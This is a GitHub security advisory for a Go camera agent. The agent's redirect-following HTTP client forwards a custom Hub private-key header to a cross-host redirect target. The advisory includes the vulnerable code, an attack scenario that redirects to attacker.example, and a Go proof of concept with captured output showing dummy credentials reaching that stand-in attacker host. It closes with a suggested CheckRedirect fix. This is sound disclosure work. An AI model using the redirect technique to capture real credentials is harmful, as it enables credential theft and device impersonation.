# [M] Kerberos Hub private key (X-Kerberos-Hub-PrivateKey) leaked to cross-host redirect target due to redirect-following HTTP client without CheckRedirect

## Summary
Severity: Medium
Advisory: GHSA-h5gx-45rj-2h5j
CVE: CVE-2026-50192
CWE: CWE-200, CWE-522
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-02
Source: https://github.com/advisories/GHSA-h5gx-45rj-2h5j
Type: github-advisory

## Affected
- Go: `github.com/kerberos-io/agent/machinery` — affected >=0 <0.0.0-20260528173546-51f1a52e170f

## Details
### Summary

The Kerberos Hub upload path sends the agent's Hub credentials in the custom `X-Kerberos-Hub-PrivateKey` and `X-Kerberos-Hub-PublicKey` request headers to the operator-configured Hub URL (`config.HubURI`). The HTTP client used (`&http.Client{}` in `UploadKerberosHub`) is constructed without a `CheckRedirect` policy, so it follows HTTP redirects automatically. Go's `net/http` strips only sensitive headers (`Authorization`, `Cookie`, `WWW-Authenticate`) on a cross-host redirect; it does **not** strip custom headers such as `X-Kerberos-Hub-PrivateKey`. As a result, if the configured `HubURI` returns a cross-host 30x redirect, the Hub private key is forwarded verbatim to the redirect target, disclosing the credential to an unintended third party (CWE-200 / CWE-522).

### Impact

The Kerberos Hub private key (a long-lived secret authenticating the agent to Kerberos Hub) is leaked to an attacker-controlled host whenever the configured `HubURI` issues a cross-origin redirect. `HubURI` is operator configuration (`models.Config.HubURI`, JSON `hub_uri`); an open redirect on that host, a compromised/hijacked Hub deployment, a DNS/BGP hijack, or a malicious URL supplied in the agent config causes the secret to be exfiltrated. The leaked private key (together with the public key, which is forwarded in the same request) grants the attacker the agent's access to Kerberos Hub, including the ability to upload/impersonate the device.

### Vulnerable code (file:line)

`machinery/src/cloud/kerberos_hub.go` — the custom auth headers are set on a request to the operator-configurable `config.HubURI`, and the client follows redirects (no `CheckRedirect`):

```go
	// Check if we are allowed to upload to the hub with these credentials.
	// There might be different reasons like (muted, read-only..)
	req, err := http.NewRequest("HEAD", config.HubURI+"/storage/upload", nil)
	if err != nil {
		errorMessage := "UploadKerberosHub: error reading HEAD request, " + config.HubURI + "/storage: " + err.Error()
		log.Log.Error(errorMessage)
		return false, true, errors.New(errorMessage)
	}

	req.Header.Set("X-Kerberos-Storage-FileName", fileName)
	req.Header.Set("X-Kerberos-Storage-Capture", "IPCamera")
	req.Header.Set("X-Kerberos-Storage-Device", config.Key)
	req.Header.Set("X-Kerberos-Hub-PublicKey", config.HubKey)
	req.Header.Set("X-Kerberos-Hub-PrivateKey", config.HubPrivateKey)   // line 63
	req.Header.Set("X-Kerberos-Hub-Region", config.S3.Region)

	var client *http.Client
	if os.Getenv("AGENT_TLS_INSECURE") == "true" {
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client = &http.Client{Transport: tr}
	} else {
		client = &http.Client{}   // line 73 — no CheckRedirect
	}

	resp, err := client.Do(req)
```

`HubURI` is operator configuration:

```go
HubURI                  string       `json:"hub_uri" bson:"hub_uri"`
```

### Attack scenario

1. An operator configures the agent with a `hub_uri`.
2. That host (or a host reachable from it via redirect) responds to `/storage/upload` with `302 Found` to `https://attacker.example/...`.
3. `client.Do(req)` follows the redirect and re-sends the request, including `X-Kerberos-Hub-PrivateKey` and `X-Kerberos-Hub-PublicKey`, to `attacker.example`.
4. The attacker captures the Hub credentials.

### Proof of concept

Driver built against the verbatim pinned `kerberos_hub.go` from v3.6.25. The exported `cloud.UploadKerberosHub` is invoked. Two hostnames resolve to local test servers so `net/http` treats the 302 as a genuine cross-host redirect.

```go
package main

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"sync"

	"github.com/kerberos-io/agent/machinery/src/cloud"
	"github.com/kerberos-io/agent/machinery/src/models"
)

func installResolver(mapping map[string]string) {
	tr := http.DefaultTransport.(*http.Transport).Clone()
	tr.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		host, _, _ := net.SplitHostPort(addr)
		if target, ok := mapping[host]; ok {
			addr = target
		}
		return (&net.Dialer{}).DialContext(ctx, network, addr)
	}
	http.DefaultTransport = tr
}

func main() {
	var mu sync.Mutex
	var sawPriv, sawPub string
	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		sawPriv = r.Header.Get("X-Kerberos-Hub-PrivateKey")
		sawPub = r.Header.Get("X-Kerberos-Hub-PublicKey")
		mu.Unlock()
		fmt.Printf("[attacker host %s] received %s %s\n", r.Host, r.Method, r.URL.Path)
		fmt.Printf("[attacker host %s]   X-Kerberos-Hub-PrivateKey = %q\n", r.Host, r.Header.Get("X-Kerberos-Hub-PrivateKey"))
		w.WriteHeader(200)
	}))
	defer attacker.Close()

	legit := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Printf("[legit host %s] received %s %s -> 302 to attacker.example\n", r.Host, r.Method, r.URL.Path)
		http.Redirect(w, r, "http://attacker.example"+r.URL.Path, http.StatusFound)
	}))
	defer legit.Close()

	installResolver(map[string]string{
		"legit.example":    strings.TrimPrefix(legit.URL, "http://"),
		"attacker.example": strings.TrimPrefix(attacker.URL, "http://"),
	})

	os.MkdirAll("data/recordings", 0o755)
	os.WriteFile("data/recordings/clip.mp4", []byte("FAKEMP4DATA"), 0o644)

	cfg := &models.Configuration{
		Config: models.Config{
			HubURI:        "http://legit.example", // operator-configurable base URL
			HubKey:        "PUBLIC-KEY-12345",
			HubPrivateKey: "SECRET-PRIVATE-KEY-DO-NOT-LEAK",
			Key:           "device-key",
		},
	}
	cfg.Config.S3.Region = "us-east-1"
	_, _, _ = cloud.UploadKerberosHub(cfg, "clip.mp4")

	mu.Lock()
	defer mu.Unlock()
	fmt.Printf("attacker host saw X-Kerberos-Hub-PrivateKey = %q\n", sawPriv)
	fmt.Printf("attacker host saw X-Kerberos-Hub-PublicKey  = %q\n", sawPub)
}
```

### End-to-end reproduction

Pinned to `github.com/kerberos-io/agent/machinery@v3.6.25`. Verbatim `kerberos_hub.go` from that tag. Captured stdout:

```
legit (operator-configured) HubURI = http://legit.example  (-> 127.0.0.1)
attacker host (cross-origin)        = http://attacker.example  (-> 127.0.0.1)
calling cloud.UploadKerberosHub then client.Do
[INFO] UploadKerberosHub: Uploading to Kerberos Hub (http://legit.example)
[INFO] UploadKerberosHub: Upload started for clip.mp4
[legit host legit.example] received HEAD /storage/upload -> 302 to attacker.example
[attacker host attacker.example] received HEAD /storage/upload
[attacker host attacker.example]   X-Kerberos-Hub-PrivateKey = "SECRET-PRIVATE-KEY-DO-NOT-LEAK"
[attacker host attacker.example]   X-Kerberos-Hub-PublicKey  = "PUBLIC-KEY-12345"
[INFO] UploadKerberosHub: Upload allowed using the credentials provided (PUBLIC-KEY-12345, SECRET-PRIVATE-KEY-DO-NOT-LEAK)
[legit host legit.example] received POST /storage/upload -> 302 to attacker.example
[attacker host attacker.example] received GET /storage/upload
[attacker host attacker.example]   X-Kerberos-Hub-PrivateKey = "SECRET-PRIVATE-KEY-DO-NOT-LEAK"
[attacker host attacker.example]   X-Kerberos-Hub-PublicKey  = "PUBLIC-KEY-12345"
[INFO] UploadKerberosHub: Upload Finished, 200 OK.
----- RESULT -----
attacker host saw X-Kerberos-Hub-PrivateKey = "SECRET-PRIVATE-KEY-DO-NOT-LEAK"
attacker host saw X-Kerberos-Hub-PublicKey  = "PUBLIC-KEY-12345"
LEAK CONFIRMED: hub private key forwarded to cross-origin redirect target
----- NEGATIVE CONTROL (same bare &http.Client{}, legit.example -> attacker.example) -----
attacker saw Authorization             = ""  (stdlib strips standard auth header cross-host)
attacker saw X-Kerberos-Hub-PrivateKey = "SECRET-PRIVATE-KEY-DO-NOT-LEAK"  (custom header NOT stripped -> the bug)
```

The negative control on the same bare client and same cross-host redirect shows the standard `Authorization` header is stripped by `net/http`, while the custom `X-Kerberos-Hub-PrivateKey` is forwarded — confirming the leak is specific to the custom-named auth header.

### Suggested fix

Set a `CheckRedirect` policy on the client used in `UploadKerberosHub` (and the other Hub helpers in this file) that strips the `X-Kerberos-Hub-PrivateKey` / `X-Kerberos-Hub-PublicKey` headers (and any other custom auth headers) when the redirect target host differs from the original request host:

```go
checkRedirect := func(req *http.Request, via []*http.Request) error {
	if len(via) > 0 && req.URL.Host != via[0].URL.Host {
		req.Header.Del("X-Kerberos-Hub-PrivateKey")
		req.Header.Del("X-Kerberos-Hub-PublicKey")
	}
	return nil
}
client = &http.Client{CheckRedirect: checkRedirect}
```

A regression test should assert that after a cross-host redirect the `X-Kerberos-Hub-PrivateKey` header is absent at the final host, and that same-host redirects still carry it.

### Fix PR

A fix PR implementing the `CheckRedirect` strip plus a cross-host regression test is provided to the maintainer through the advisory's private temporary fork.

### Credit

Reported by tonghuaroot.

## References
- https://github.com/kerberos-io/agent/security/advisories/GHSA-h5gx-45rj-2h5j
- https://github.com/kerberos-io/agent/commit/51f1a52e170f21c1264c6de1dc781d5b5e2a5d09
- https://github.com/kerberos-io/agent
